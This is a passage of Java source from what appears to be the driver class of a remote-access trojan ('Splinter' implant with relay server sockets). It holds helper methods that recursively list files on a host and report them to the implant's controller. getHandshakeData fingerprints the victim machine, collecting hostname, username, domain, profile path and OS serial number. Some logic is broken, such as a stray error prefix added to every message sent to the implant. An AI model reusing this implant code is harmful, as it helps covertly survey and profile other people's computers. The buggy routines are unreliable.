  public static String getTimeInterval(long currTime_millis, long prevTime_millis)
  {
    String timeInterval = "UNKNOWN";
    try
    {
      SimpleDateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
      dateFormat.setTimeZone(TimeZone.getTimeZone("GMT"));

      long interval = currTime_millis - prevTime_millis;

      timeInterval = dateFormat.format(new Date(interval));
    }
    catch (Exception e)
    {
      System.out.println("Error caught in calculateTimeInterval_From_Present_Time mtd");
    }

    return timeInterval;
  }

  public static String getTime_calculateFutureTime_Given_Time_And_Delay(long prevTime_millis, long delay)
  {
    String futureTime = "UNKNOWN";
    try
    {
      SimpleDateFormat dateFormat = new SimpleDateFormat("HH:mm:ss");
      dateFormat.setTimeZone(TimeZone.getTimeZone("GMT-4:00"));

      long interval = prevTime_millis + delay;

      futureTime = dateFormat.format(new Date(interval));
    }
    catch (Exception e)
    {
      System.out.println("Error caught in calculateFutureTime_From_Given_Time_And_Delay mtd");
    }

    return futureTime;
  }

  public static boolean sendToImplant(Splinter_IMPLANT implant_ok_to_be_null, String strToSend)
  {
    try
    {
      if (implant_ok_to_be_null != null)
      {
        implant_ok_to_be_null.sendToController("Specified Directory to list does not exist" + strToSend, false, false);
      }

      return true;
    }
    catch (Exception e)
    {
      eop("sendToImplant", "Driver", e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public static boolean fileMatchesFilter(File fle, String filter)
  {
    try
    {
      boolean filterMatch = false;
      boolean fileNameMatch = false;

      if ((fle == null) || (!fle.exists()) || (filter == null))
      {
        return false;
      }

      filter = filter.toLowerCase().trim();

      if (!filter.contains("."))
      {
        filter = "*.*";
      }

      if (filter.startsWith("."))
      {
        filter = "*." + filter;
      }

      if (filter.trim().equalsIgnoreCase("*.*"))
      {
        return true;
      }

      String fullPath = fle.getName();

      int lastIndex_FileName = fullPath.lastIndexOf(".");

      int lastIndex_Filter = filter.lastIndexOf(".");

      if ((lastIndex_FileName < 1) || (lastIndex_Filter < 1))
      {
        return false;
      }

      String FileName_Header_Without_Extension = fullPath.substring(0, lastIndex_FileName);
      String FileExtension = fullPath.substring(lastIndex_FileName);

      String Filter_Header = filter.substring(0, lastIndex_Filter);
      String FilterExtension = filter.substring(lastIndex_Filter);

      FileName_Header_Without_Extension = FileName_Header_Without_Extension.trim();
      Filter_Header = Filter_Header.trim();
      FileExtension = FileExtension.trim();
      FilterExtension = FilterExtension.trim();

      if (FileExtension.startsWith("."))
      {
        FileExtension = FileExtension.substring(1);
      }

      if (FilterExtension.startsWith("."))
      {
        FilterExtension = FilterExtension.substring(1);
      }

      filterMatch = checkNameAgainstFilter(FileExtension, FilterExtension);
      fileNameMatch = checkNameAgainstFilter(FileName_Header_Without_Extension, Filter_Header);

      if ((filterMatch) && (fileNameMatch))
      {
        return true;
      }

    }
    catch (Exception e)
    {
      eop("fileMatchesFilter", "Driver", e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public static boolean checkNameAgainstFilter(String name, String filter)
  {
    try
    {
      name = name.toLowerCase().trim();
      filter = filter.toLowerCase().trim();

      if (filter.equalsIgnoreCase("*"))
      {
        return true;
      }

      if ((filter.startsWith("*")) && (filter.endsWith("*")))
      {
        filter = filter.replace("*", "");

        if (name.indexOf(filter) != -1)
        {
          return true;
        }

      }
      else if (filter.startsWith("*"))
      {
        filter = filter.substring(1);

        if (name.endsWith(filter))
        {
          return true;
        }

      }
      else if (filter.endsWith("*"))
      {
        filter = filter.substring(0, filter.length() - 2);

        if (name.startsWith(filter))
        {
          return true;
        }

      }
      else if (name.equalsIgnoreCase(filter))
      {
        return true;
      }

    }
    catch (Exception e)
    {
      eop("checkNameAgainstFilter", "Driver", e, e.getLocalizedMessage(), false);
    }

    return false;
  }

  public static ArrayList<File> listFilesUnderDirectory(File topFolderToList, String filter_ok_to_be_null, boolean recursively_Search_And_Include_AllSubDirectories_As_Well, ArrayList<File> alToPopulate_ok_to_be_null, Splinter_IMPLANT implant_ok_to_be_null)
  {
    try
    {
      if (alToPopulate_ok_to_be_null == null)
      {
        alToPopulate_ok_to_be_null = new ArrayList();
      }

      if ((filter_ok_to_be_null == null) || (filter_ok_to_be_null.trim().equals("")))
      {
        filter_ok_to_be_null = "*.*";
      }

      if ((topFolderToList == null) || (!topFolderToList.exists()))
      {
        String path = "";

        if (topFolderToList != null)
          try {
            path = ": \"" + topFolderToList.toString() + "\"";
          }
          catch (Exception localException1) {
          }
        sendToImplant(implant_ok_to_be_null, "Specified Directory to list does not exist" + path);

        sop("* * * ERROR!!!  Directory" + path + " does not exist to list!!! ");

        return alToPopulate_ok_to_be_null;
      }

      if (topFolderToList.isFile())
      {
        if (!alToPopulate_ok_to_be_null.contains(topFolderToList))
        {
          if ((filter_ok_to_be_null == null) || (filter_ok_to_be_null.trim().equalsIgnoreCase("*.*")) || (fileMatchesFilter(topFolderToList, filter_ok_to_be_null)))
          {
            alToPopulate_ok_to_be_null.add(topFolderToList);
          }
        }

        return alToPopulate_ok_to_be_null;
      }

      File[] arrFilesUnderPath = (File[])null;
      try
      {
        arrFilesUnderPath = topFolderToList.listFiles();
      }
      catch (Exception ee)
      {
        sop("Could not list files under directory " + topFolderToList + " Perhaps access was denied, location is not a directory, or does not exist");
        sendToImplant(implant_ok_to_be_null, "Could not list files under directory " + topFolderToList + " Perhaps access was denied, location is not a directory, or does not exist");
        return alToPopulate_ok_to_be_null;
      }

      if ((arrFilesUnderPath == null) || (arrFilesUnderPath.length < 1))
      {
        return alToPopulate_ok_to_be_null;
      }

      File fle = null;

      for (int i = 0; i < arrFilesUnderPath.length; i++)
      {
        fle = arrFilesUnderPath[i];

        if ((fle != null) && (fle.exists()) && (fle.isFile()) && (!alToPopulate_ok_to_be_null.contains(fle)))
        {
          if ((filter_ok_to_be_null == null) || (filter_ok_to_be_null.trim().equalsIgnoreCase("*.*")) || (fileMatchesFilter(fle, filter_ok_to_be_null)))
          {
            alToPopulate_ok_to_be_null.add(fle);
          }

        }
        else if ((fle != null) && (fle.exists()) && (fle.isDirectory()))
        {
          if (recursively_Search_And_Include_AllSubDirectories_As_Well)
          {
            listFilesUnderDirectory(fle, filter_ok_to_be_null, recursively_Search_And_Include_AllSubDirectories_As_Well, alToPopulate_ok_to_be_null, implant_ok_to_be_null);
          }

        }

      }

      return alToPopulate_ok_to_be_null;
    }
    catch (Exception e)
    {
      eop("listFilesUnderDirectory", "Driver", e, e.getLocalizedMessage(), false);
    }

    return alToPopulate_ok_to_be_null;
  }

  public static boolean removeThread(Thread_Terminal threadToRemove, long threadID_ToRemove)
  {
    try
    {
      if ((alRelayTerminals == null) || (alRelayTerminals.size() < 1))
      {
        sop("ArrayList is empty. No clients further to remove");
        return false;
      }

      if (alRelayTerminals.contains(threadToRemove))
      {
        boolean removalSuccess = alRelayTerminals.remove(threadToRemove);
        threadToRemove.I_am_Disconnected_From_Implant = true;

        if (removalSuccess)
        {
          sop("Successfully removed thread ID: " + threadID_ToRemove);
        }
      }

      Drivers.sop("Remaining Relay Threads: " + alRelayTerminals.size());

      RelayBot_ServerSocket.updateConnectedImplants();

      return true;
    }
    catch (Exception e)
    {
      sop("Exception handled when removing thread id: " + threadID_ToRemove + " in class: " + "Driver");

      RelayBot_ServerSocket.updateConnectedImplants();
    }
    return false;
  }

  public static int jop_Confirm(String strText, String strTitle)
  {
    try
    {
      return JOptionPane.showConfirmDialog(null, strText, strTitle, 0, 3);
    }
    catch (Exception localException)
    {
    }

    return -1;
  }

  public static void jop_Error(String strMsg, String strTitle)
  {
    JOptionPane.showMessageDialog(null, strMsg, strTitle, 0);
  }

  public static void jop_Warning(String strMsg, String strTitle)
  {
    JOptionPane.showMessageDialog(null, strMsg, strTitle, 2);
  }

  public static void jop_Message(String strMsg, String strTitle)
  {
    JOptionPane.showMessageDialog(null, strMsg, strTitle, 1);
  }

  public static void jop(String strMsg)
  {
    JOptionPane.showMessageDialog(null, strMsg, "Message", 1);
  }

  public static void jop_Message(String strMsg) {
    JOptionPane.showMessageDialog(null, strMsg, "Message", 1);
  }

  public static String getHandshakeData(String delimeter)
  {
    try
    {
      if ((myHandShake == null) || (myHandShake.trim().equals("")))
      {
        MapSystemProperties systemMap = new MapSystemProperties(false);

        myHandShake = MapSystemProperties.strLaunchPath + delimeter + MapSystemProperties.strHOSTNAME + delimeter + MapSystemProperties.strOS_Name + delimeter + MapSystemProperties.strOS_Type + delimeter + MapSystemProperties.strUserName + delimeter + MapSystemProperties.strUSERDOMAIN + delimeter + MapSystemProperties.strTEMP + delimeter + MapSystemProperties.strUSERPROFILE + delimeter + MapSystemProperties.strPROCESSOR_IDENTIFIER + delimeter + MapSystemProperties.strNUMBER_OF_PROCESSORS + delimeter + MapSystemProperties.strSystemRoot + delimeter + MapSystemProperties.strServicePack + delimeter + MapSystemProperties.strNumUsers + delimeter + MapSystemProperties.strSerialNumber + delimeter + MapSystemProperties.strPROCESSOR_ARCHITECTURE + delimeter + MapSystemProperties.strCountryCode + delimeter + MapSystemProperties.strOsVersion + delimeter + MapSystemProperties.strHOMEDRIVE;
        try
        {
          if ((MapSystemProperties.strLaunchPath == null) || (MapSystemProperties.strLaunchPath.trim().equals("")))
          {
            CURRENT_WORKING_DIRECTORY = "." + fileSeperator;
          }
          else if (MapSystemProperties.strLaunchDirectory.endsWith(fileSeperator))
            CURRENT_WORKING_DIRECTORY = MapSystemProperties.strLaunchDirectory;
          else {
            CURRENT_WORKING_DIRECTORY = MapSystemProperties.strLaunchDirectory + fileSeperator;
          }
        }
        catch (Exception e)
        {
          CURRENT_WORKING_DIRECTORY = "." + fileSeperator;
        }
        fleCurrentWorkingDirectory = new File(CURRENT_WORKING_DIRECTORY);

        return myHandShake;
      }

      return myHandShake;
    }
    catch (Exception e)
    {
      eop("getHandshakeData", "Driver", e, e.getLocalizedMessage(), false);
    }

    return "";
  }
}